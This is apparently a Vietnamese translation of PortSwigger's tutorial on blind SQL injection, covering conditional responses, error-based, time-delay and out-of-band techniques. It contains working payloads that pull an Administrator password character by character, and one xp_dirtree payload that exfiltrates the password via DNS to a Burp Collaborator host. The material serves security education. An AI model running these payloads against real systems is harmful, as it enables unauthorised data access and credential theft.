## Đây là bảng dịch từ tiếng anh sang tiếng việt về Blind Injection của PortSwigger

### 1. Blind SQL Injection là gì?
- Blind SQL injection xảy ra khi một ứng dụng có lỗ hổng SQL injection, nhưng các HTTP Response của ứng dụng không chứa kết quả của truy vấn SQL liên quan hoặc thông tin chi tiết về bất kỳ lỗi cơ sở dữ liệu nào.
- Nhiều kỹ thuật như các cuộc tấn công `UNION` không hiệu quả với các lỗ hổng blind SQL injection. Điều này là do chúng phụ thuộc vào khả năng nhìn thấy kết quả của truy vấn được chèn vào trong các phản hồi của ứng dụng. Tuy nhiên, vẫn có thể khai thác blind SQL injection để truy cập dữ liệu trái phép, nhưng phải sử dụng các kỹ thuật khác.
### 2. Khai thác SQL Injection bằng kích hoạt các phản hồi có điều kiện
- Hãy xem xét một ứng dụng sử dụng cookie theo dõi (tracking cookie) để thu thập dữ liệu phân tích về việc sử dụng ứng dụng. Các yêu cầu gửi đến ứng dụng bao gồm một header cookie như sau:
  ```
  Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
  ```
- Khi một yêu cầu chứa cookie TrackingId được xử lý, ứng dụng sử dụng một truy vấn SQL để xác định xem đây có phải là người dùng đã biết hay không:
  ```
  SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
  ```
 - Truy vấn này có thể bị tấn công bằng SQL injection, nhưng kết quả của truy vấn không được trả về cho người dùng. Tuy nhiên, ứng dụng hoạt động khác nhau tùy thuộc vào việc truy vấn có trả về dữ liệu hay không. Nếu bạn gửi một `TrackingId` đã được nhận diện, truy vấn sẽ trả về dữ liệu và bạn sẽ nhận được thông báo "Welcome back" (Chào mừng trở lại) trong phản hồi.
 - Hành vi này đủ để có thể khai thác lỗ hổng blind SQL injection. Bạn có thể truy xuất thông tin bằng cách kích hoạt các phản hồi khác nhau một cách có điều kiện, tùy thuộc vào điều kiện được chèn vào.
- Để hiểu cách thức khai thác này hoạt động, hãy giả sử rằng hai yêu cầu lần lượt được gửi đi với các giá trị cookie `TrackingId` sau:
  ```
  …xyz' AND '1'='1
  …xyz' AND '1'='2
  ```
   - Giá trị đầu tiên khiến truy vấn trả về kết quả, bởi vì điều kiện AND '1'='1 được chèn vào là đúng. Kết quả là thông báo "Welcome back" được hiển thị.
   - Giá trị thứ hai khiến truy vấn không trả về kết quả nào, bởi vì điều kiện được chèn vào là sai. Thông báo "Welcome back" không được hiển thị.
- Điều này cho phép chúng ta xác định câu trả lời cho bất kỳ điều kiện đơn lẻ nào được chèn vào, đồng thời trích xuất dữ liệu từng phần một.
- Ví dụ, giả sử có một bảng tên Users với các cột Username và Password, cùng với một người dùng tên Administrator. Bạn có thể xác định mật khẩu của người dùng này bằng cách gửi một chuỗi các đầu vào để kiểm tra mật khẩu từng ký tự một.
- Để thực hiện điều này, hãy bắt đầu bằng đầu vào sau:
  ```
  xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
  ```
- Điều này trả về thông báo "Welcome back", cho biết điều kiện được chèn vào là đúng, và do đó ký tự đầu tiên của mật khẩu lớn hơn `m`.
- Tiếp theo, chúng ta gửi đầu vào sau:
  ```
  xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
  ```
- Điều này không trả về thông báo "Welcome back", cho biết điều kiện được chèn vào là sai, và do đó ký tự đầu tiên của mật khẩu không lớn hơn `t`.
- Cuối cùng, chúng ta gửi đầu vào sau, kết quả trả về thông báo "Welcome back", qua đó xác nhận rằng ký tự đầu tiên của mật khẩu là `s`:
  ```
  xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
  ```
- Chúng ta có thể tiếp tục quá trình này một cách có hệ thống để xác định toàn bộ mật khẩu của người dùng `Administrator`.
- Lưu ý : Hàm `SUBSTRING` được gọi là `SUBSTR` trên một số loại cơ sở dữ liệu. Để biết thêm chi tiết, hãy xem https://portswigger.net/web-security/sql-injection/cheat-sheet.
### 3. Error-based SQL injection
- Error-based SQL injection đề cập đến những trường hợp bạn có thể sử dụng thông báo lỗi để trích xuất hoặc suy luận dữ liệu nhạy cảm từ cơ sở dữ liệu, ngay cả trong các ngữ cảnh blind. Khả năng thực hiện phụ thuộc vào cấu hình của cơ sở dữ liệu và các loại lỗi mà bạn có thể kích hoạt:
- Bạn có thể khiến ứng dụng trả về một phản hồi lỗi cụ thể dựa trên kết quả của một biểu thức Boolean. Bạn có thể khai thác điều này theo cách tương tự như các phản hồi có điều kiện mà chúng ta đã tìm hiểu trong phần trước. Để biết thêm thông tin, hãy xem Exploiting blind SQL injection by triggering conditional errors(3.1)
- Bạn có thể kích hoạt các thông báo lỗi hiển thị dữ liệu được truy vấn trả về. Điều này về cơ bản biến các lỗ hổng blind SQL injection thành các lỗ hổng có thể quan sát được. Để biết thêm thông tin, hãy xem Extracting sensitive data via verbose SQL error messages(3.2)
#### 3.1 Khai thác Blind SQL Injection bằng cách kích hoạt các lỗi có điều kiện
- Một số ứng dụng thực hiện các truy vấn SQL nhưng hành vi của chúng không thay đổi, bất kể truy vấn có trả về dữ liệu hay không. Kỹ thuật trong phần trước sẽ không hoạt động, bởi vì việc chèn các điều kiện Boolean khác nhau không tạo ra sự khác biệt nào đối với phản hồi của ứng dụng.
- Thông thường, có thể khiến ứng dụng trả về một phản hồi khác tùy thuộc vào việc có xảy ra lỗi SQL hay không. Bạn có thể sửa đổi truy vấn để nó gây ra lỗi cơ sở dữ liệu chỉ khi điều kiện là đúng. Rất thường xuyên, một lỗi không được xử lý do cơ sở dữ liệu phát sinh sẽ khiến phản hồi của ứng dụng có sự khác biệt nào đó, chẳng hạn như một thông báo lỗi. Điều này cho phép bạn suy luận tính đúng sai của điều kiện được chèn vào.
- Để xem cách thức hoạt động, hãy giả sử rằng hai yêu cầu lần lượt được gửi đi với các giá trị cookie `TrackingId` sau:
  ```
  xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
  xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
  ```
- Các đầu vào này sử dụng từ khóa `CASE` để kiểm tra một điều kiện và trả về một biểu thức khác nhau tùy thuộc vào việc biểu thức đó đúng hay sai:
  - Với đầu vào đầu tiên, biểu thức `CASE` đánh giá thành 'a', điều này không gây ra bất kỳ lỗi nào.
  - Với đầu vào thứ hai, biểu thức được đánh giá thành 1/0, gây ra lỗi chia cho 0.
- Nếu lỗi gây ra sự khác biệt trong phản hồi HTTP của ứng dụng, bạn có thể sử dụng điều này để xác định xem điều kiện được chèn vào có đúng hay không.
- Bằng cách sử dụng kỹ thuật này, bạn có thể truy xuất dữ liệu bằng cách kiểm tra từng ký tự một:
  ```
  xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
  ```
- Lưu ý

Có nhiều cách khác nhau để kích hoạt các lỗi có điều kiện, và những kỹ thuật khác nhau sẽ hoạt động tốt nhất trên các loại cơ sở dữ liệu khác nhau. Để biết thêm chi tiết, hãy xem https://portswigger.net/web-security/sql-injection/cheat-sheet
#### 3.2 Trích xuất dữ liệu nhạy cảm thông qua các thông báo lỗi SQL chi tiết
- Cấu hình của cơ sở dữ liệu đôi khi khiến các thông báo lỗi được hiển thị chi tiết. Những thông báo này có thể cung cấp thông tin hữu ích cho kẻ tấn công. Ví dụ, hãy xem xét thông báo lỗi sau, xuất hiện sau khi chèn một dấu nháy đơn vào tham số `id`:
  ```
  Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char
  ```
- Điều này cho thấy toàn bộ truy vấn mà ứng dụng đã tạo bằng cách sử dụng đầu vào của chúng ta. Trong trường hợp này, chúng ta có thể thấy rằng đầu vào đang được chèn vào một chuỗi được bao quanh bởi dấu nháy đơn bên trong một câu lệnh `WHERE`. Điều này giúp việc xây dựng một truy vấn hợp lệ chứa payload độc hại trở nên dễ dàng hơn. Việc chú thích phần còn lại của truy vấn sẽ ngăn dấu nháy đơn dư thừa phá vỡ cú pháp.
- Đôi khi, bạn có thể khiến ứng dụng tạo ra một thông báo lỗi chứa một phần dữ liệu được truy vấn trả về. Điều này về cơ bản biến một lỗ hổng blind SQL injection thành một lỗ hổng có thể quan sát được.
- Bạn có thể sử dụng hàm `CAST()` để thực hiện điều này. Hàm này cho phép bạn chuyển đổi một kiểu dữ liệu này sang một kiểu dữ liệu khác. Ví dụ, hãy tưởng tượng một truy vấn chứa câu lệnh sau:
  ```
  CAST((SELECT example_column FROM example_table) AS int)
  ```
- Thông thường, dữ liệu mà bạn đang cố đọc là một chuỗi. Việc cố gắng chuyển đổi chuỗi này sang một kiểu dữ liệu không tương thích, chẳng hạn như `int`, có thể gây ra lỗi tương tự như sau:
  ```
  ERROR: invalid input syntax for type integer: "Example data"
  ```
- Loại truy vấn này cũng có thể hữu ích nếu giới hạn ký tự ngăn bạn kích hoạt các phản hồi có điều kiện.
### 4. Khai thác SQL Injection bằng cách kích hoạt độ trễ thời gian
- Nếu ứng dụng bắt các lỗi cơ sở dữ liệu khi truy vấn SQL được thực thi và xử lý chúng một cách bình thường, sẽ không có sự khác biệt nào trong phản hồi của ứng dụng. Điều này có nghĩa là kỹ thuật trước đó nhằm kích hoạt các lỗi có điều kiện sẽ không hoạt động.
- Trong tình huống này, thường có thể khai thác lỗ hổng blind SQL injection bằng cách kích hoạt độ trễ thời gian, tùy thuộc vào việc điều kiện được chèn vào là đúng hay sai. Vì các truy vấn SQL thường được ứng dụng xử lý một cách đồng bộ, việc làm chậm quá trình thực thi một truy vấn SQL cũng sẽ làm chậm phản hồi HTTP. Điều này cho phép bạn xác định tính đúng sai của điều kiện được chèn vào dựa trên thời gian cần thiết để nhận được phản hồi HTTP.
- Các kỹ thuật kích hoạt độ trễ thời gian phụ thuộc vào loại cơ sở dữ liệu đang được sử dụng. Ví dụ, trên Microsoft SQL Server, bạn có thể sử dụng cách sau để kiểm tra một điều kiện và kích hoạt độ trễ tùy thuộc vào việc biểu thức đó đúng hay sai:
  ```
  '; IF (1=2) WAITFOR DELAY '0:0:10'--
  '; IF (1=1) WAITFOR DELAY '0:0:10'--
  ```
- Bằng cách sử dụng kỹ thuật này, chúng ta có thể truy xuất dữ liệu bằng cách kiểm tra từng ký tự một:
  ```
  '; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
  ```
- Lưu ý: Có nhiều cách khác nhau để kích hoạt độ trễ thời gian bên trong các truy vấn SQL, và những kỹ thuật khác nhau sẽ áp dụng cho các loại cơ sở dữ liệu khác nhau. Để biết thêm chi tiết, hãy xem https://portswigger.net/web-security/sql-injection/cheat-sheet
### 5. Khai thác tính năng chèn SQL mù bằng kỹ thuật ngoài băng tần (OAST)
- Một ứng dụng có thể thực hiện cùng truy vấn SQL như ví dụ trước nhưng theo cách bất đồng bộ (asynchronously). Ứng dụng tiếp tục xử lý yêu cầu của người dùng trong luồng ban đầu, đồng thời sử dụng một luồng khác để thực thi truy vấn SQL bằng cookie theo dõi. Truy vấn vẫn dễ bị SQL injection, nhưng không có kỹ thuật nào được mô tả cho đến nay có thể hoạt động. Phản hồi của ứng dụng không phụ thuộc vào việc truy vấn có trả về dữ liệu hay không, có xảy ra lỗi cơ sở dữ liệu hay không, hoặc thời gian thực thi truy vấn là bao lâu.
- Trong tình huống này, thường có thể khai thác lỗ hổng blind SQL injection bằng cách kích hoạt các tương tác mạng out-of-band đến một hệ thống mà bạn kiểm soát. Những tương tác này có thể được kích hoạt dựa trên một điều kiện được chèn vào để suy luận thông tin từng phần một. Hữu ích hơn nữa, dữ liệu có thể được trích xuất trực tiếp thông qua tương tác mạng.
- Có thể sử dụng nhiều giao thức mạng khác nhau cho mục đích này, nhưng thông thường hiệu quả nhất là DNS (domain name service – dịch vụ tên miền). Nhiều mạng trong môi trường production cho phép các truy vấn DNS đi ra ngoài tự do, bởi vì chúng rất cần thiết cho hoạt động bình thường của các hệ thống production.
- Công cụ dễ sử dụng và đáng tin cậy nhất để sử dụng các kỹ thuật out-of-band là Burp Collaborator. Đây là một máy chủ cung cấp các triển khai tùy chỉnh của nhiều dịch vụ mạng khác nhau, bao gồm DNS. Nó cho phép bạn phát hiện khi các tương tác mạng xảy ra do việc gửi từng payload riêng lẻ đến một ứng dụng có lỗ hổng. Burp Suite Professional bao gồm một client tích hợp sẵn được cấu hình để hoạt động với Burp Collaborator ngay từ đầu. Để biết thêm thông tin, hãy xem tài liệu hướng dẫn về Burp Collaborator https://portswigger.net/burp/documentation/desktop/tools/collaborator
- Các kỹ thuật kích hoạt truy vấn DNS phụ thuộc vào loại cơ sở dữ liệu đang được sử dụng. Ví dụ, đầu vào sau trên Microsoft SQL Server có thể được sử dụng để khiến một truy vấn DNS được thực hiện đến một tên miền được chỉ định:
  ```
  '; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
  ```
- Điều này khiến cơ sở dữ liệu thực hiện tra cứu đối với tên miền sau:
  ```
  0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net
  ```
- Bạn có thể sử dụng Burp Collaborator để tạo một tên miền phụ duy nhất và truy vấn máy chủ Collaborator nhằm xác nhận khi nào các hoạt động tra cứu DNS xảy ra.
- Sau khi xác nhận được cách kích hoạt các tương tác out-of-band, bạn có thể sử dụng kênh out-of-band để trích xuất dữ liệu từ ứng dụng có lỗ hổng. Ví dụ:
  ```
  '; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
  ```
- Đầu vào này đọc mật khẩu của người dùng `Administrator`, nối thêm một tên miền phụ Collaborator duy nhất và kích hoạt một truy vấn DNS. Việc tra cứu này cho phép bạn xem mật khẩu đã được thu thập:
  ```
  S3ure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net
  ```
- Các kỹ thuật out-of-band (OAST) là một phương pháp mạnh mẽ để phát hiện và khai thác blind SQL injection, nhờ khả năng thành công cao và khả năng trích xuất dữ liệu trực tiếp thông qua kênh out-of-band. Vì lý do này, các kỹ thuật OAST thường được ưu tiên ngay cả trong những tình huống mà các kỹ thuật khác để khai thác blind SQL injection cũng có thể hoạt động.
- Lưu ý: Có nhiều cách khác nhau để kích hoạt các tương tác out-of-band, và những kỹ thuật khác nhau sẽ áp dụng cho các loại cơ sở dữ liệu khác nhau. Để biết thêm chi tiết, hãy xem https://portswigger.net/web-security/sql-injection/cheat-sheet
